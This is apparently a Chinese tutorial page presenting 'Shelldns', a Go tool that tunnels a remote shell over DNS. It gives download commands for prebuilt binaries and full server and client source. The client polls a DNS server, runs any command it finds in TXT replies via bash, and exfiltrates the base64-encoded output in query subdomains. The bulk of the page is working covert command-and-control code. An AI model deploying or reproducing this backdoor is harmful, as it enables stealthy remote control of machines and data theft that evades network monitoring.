+++
title = "Shelldns"
date =  2022-07-27T10:43:44+08:00
description= "dns shell 隧道简单实现"
weight = 5
+++

利用DNS隧道，在客户端执行shell命令,并在服务端获取执行结果。

## 程序测试部分

### 准备

下载编译好的执行文件：

```shell
# linux
wget https://github.com/meimeitou/yuyuko-book/releases/download/v0.0.1/shelldns-linux
# or mac
wget https://github.com/meimeitou/yuyuko-book/releases/download/v0.0.1/shelldns-mac
```

### 服务端

服务端提供正常的DNS解析服务，和正常的递归解析服务没有区别,并且服务端启动一个dns shell服务：

```shell
chmod +x shelldns-linux
# 启动服务端
sudo ./shelldns-linux -server -addr :53
```

也可以用其它端口，这里默认是`:53`。


### 客户端

客户端启动一个持续连接服务端的dns客户端：

```shell
chmod +x shelldns-mac
# 启动客户端
./shelldns-mac -client -addr=<服务端ip>:53       
```

### 执行命令

服务端启动后会进入一个可持续输入命令的状态，只需要在`服务端`输入想要在`客户端`执行的命令即可。


服务端就是一个正常的dns forward节点 `dig @<服务端ip> <domain>` 可以测试服务端的可用性。


## 源码解析部分

程序使用go实现，代码量200行。

原理及执行流程：
- 服务端和客户端协定一个固定的zoon作为传输管道。
- 客户端不断发送ping到服务端（固定zoon的dig dns请求）。
- 服务端DNS接受终端输入的命令，如果接收到命令，就将命令写入到客户端持续ping的DNS TXT结果中。
- 客户端这边如果接受到除了ping以外的返回，就认定是服务端给的执行命令
- 客户端从DNS TXT返回结果中拿到执行命令
- 客户端将执行结果经过编码追加到DNS 固定zoon请求前缀，请求服务端
- 服务端接收到固定zoon的请求，解析域名前缀，当做命名的执行输出

`server/server.go`:

```golang
package server

import (
	"bufio"
	b64 "encoding/base64"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/miekg/dns"
	"github.com/oklog/run"
)

var (
	zoon    = ""
	cmdList = make(chan string, 1)
	output  = make(chan string, 1000)
)

func forward(w dns.ResponseWriter, req *dns.Msg) {
	c := new(dns.Client)
	r, _, err := c.Exchange(req, "114.114.114.114:53")
	if err != nil {
		m := new(dns.Msg)
		m.SetRcode(req, dns.RcodeServerFailure)
		w.WriteMsg(m)
	}
	w.WriteMsg(r)
}

func ExecServer(w dns.ResponseWriter, req *dns.Msg) {
	data := strings.TrimSuffix(req.Question[0].Name, zoon)
	if data != "" {
		eq := strings.TrimSuffix(data, ".")
		sDoec, err := b64.StdEncoding.DecodeString(eq)
		if err != nil {
			fmt.Println("err decode:", err)
			fmt.Print("-> ")
		} else {
			output <- string(sDoec)
		}
	}
	var msg string
	select {
	case data := <-cmdList:
		msg = data
	default:
		msg = "hello"
	}
	m := new(dns.Msg)
	m.SetReply(req)
	m.Extra = make([]dns.RR, 1)
	m.Extra[0] = &dns.TXT{Hdr: dns.RR_Header{Name: m.Question[0].Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0}, Txt: []string{msg}}
	w.WriteMsg(m)
}

func print(g *run.Group) {
	g.Add(
		func() error {
			var out string
			for {
				select {
				case data := <-output:
					if data == "EOF" {
						fmt.Println(out)
						fmt.Print("-> ")
						out = ""
					} else {
						out += data
					}
				default:
				}
			}
		},
		func(err error) {
		},
	)
}

func cmd(g *run.Group) {
	reader := bufio.NewReader(os.Stdin)
	fmt.Println("dns Shell")
	fmt.Println("---------------------")
	g.Add(
		func() error {
			for {
				fmt.Print("-> ")
				text, _ := reader.ReadString('\n')
				text = strings.Replace(text, "\n", "", -1)
				if text != "" {
					select {
					case cmdList <- text: // Put 2 in the channel unless it is full
					default:
						fmt.Println("Channel full. Discarding value")
					}
				}
			}
		},
		func(err error) {
		},
	)
}

func handle(g *run.Group, addr string) {
	server := &dns.Server{Addr: addr, Net: "udp", ReadTimeout: time.Minute, WriteTimeout: time.Minute}
	fmt.Println("start server...", addr)
	g.Add(
		func() error {
			return server.ListenAndServe()
		},
		func(err error) {
			server.Shutdown()
		},
	)
}

func RunServer(g *run.Group, addr, domain string) {
	zoon = domain
	dns.HandleFunc(domain, ExecServer)
	dns.HandleFunc(".", forward)
	cmd(g)
	handle(g, addr)
	print(g)
}
```

`客户端`:

```golang
package client

import (
	"bytes"
	b64 "encoding/base64"
	"fmt"
	"os/exec"
	"time"

	"github.com/miekg/dns"
	"github.com/oklog/run"
)

const (
	ShellToUse = "bash"
	maxLen     = 40 // 域名label最大长度63
)

var (
	zoon      = ""
	domainPre = make(chan string, 1000)
)

func Shellout(command string) ([]byte, error) {
	return exec.Command(ShellToUse, "-c", command).Output()
}
func Exchange(addr, data string) error {
	m := new(dns.Msg)
	dm := zoon
	if data != "" {
		dm = fmt.Sprintf("%s.%s", data, zoon)
	}
	m.SetQuestion(dm, dns.TypeTXT)
	c := new(dns.Client)
	r, _, err := c.Exchange(m, addr)
	if err != nil {
		return err
	}
	if r == nil {
		return fmt.Errorf("empty reply")
	}
	msg := ""
	for _, item := range r.Extra {
		if data, ok := item.(*dns.TXT); ok {
			msg += data.Txt[0]
		}
	}
	if msg == "hello" {
		return nil
	} else {
		fmt.Println("run: ", msg)
		out, err := Shellout(msg)
		if err != nil {
			return err
		}
		setOutput(string(out))
	}
	return nil
}

func SplitSubN(s string, n int) []string {
	sub := ""
	subs := []string{}

	runes := bytes.Runes([]byte(s))
	l := len(runes)
	for i, r := range runes {
		sub = sub + string(r)
		if (i+1)%n == 0 {
			subs = append(subs, sub)
			sub = ""
		} else if (i + 1) == l {
			subs = append(subs, sub)
		}
	}

	return subs
}
func setOutput(out string) {
	fmt.Println(out)
	sp := SplitSubN(out, maxLen)
	sp = append(sp, "EOF")
	fmt.Println(len(sp))
	for _, item := range sp {
		domainPre <- item
	}
}

func ping(g *run.Group, addr string) {
	g.Add(
		func() error {
			for {
				select {
				case data := <-domainPre:
					sEnc := b64.StdEncoding.EncodeToString([]byte(data))
					if err := Exchange(addr, sEnc); err != nil {
						fmt.Println(err)
					}
				case <-time.After(time.Second * 2):
					if err := Exchange(addr, ""); err != nil {
						fmt.Println(err)
					}
				}
			}
		},
		func(err error) {},
	)
}

func RunClient(g *run.Group, addr, domin string) {
	fmt.Println("client...", addr)
	zoon = domin
	ping(g, addr)
}
```

`main.go`

```golang
package main

import (
	"flag"
	"fmt"
	"go-test/dns/client"
	"go-test/dns/server"

	"github.com/oklog/run"
)

func main() {
	sv := flag.Bool("server", false, "run server")
	cl := flag.Bool("client", false, "run client")
	zoon := flag.String("zoon", "himecut.cc.", "domain sufix")
	ts := flag.Bool("test", false, "run test")
	addr := flag.String("addr", ":53", "addr")
	flag.Parse()

	if *sv {
		var g run.Group
		server.RunServer(&g, *addr, *zoon)
		if err := g.Run(); err != nil {
			panic(err)
		}
		return
	} else if *cl {
		var g run.Group
		client.RunClient(&g, *addr, *zoon)
		if err := g.Run(); err != nil {
			panic(err)
		}
		return
	} else if *ts {
		client.Exchange(*addr, "")
		return
	}

	fmt.Println(`
			run -server or -client  
   `)
}
```
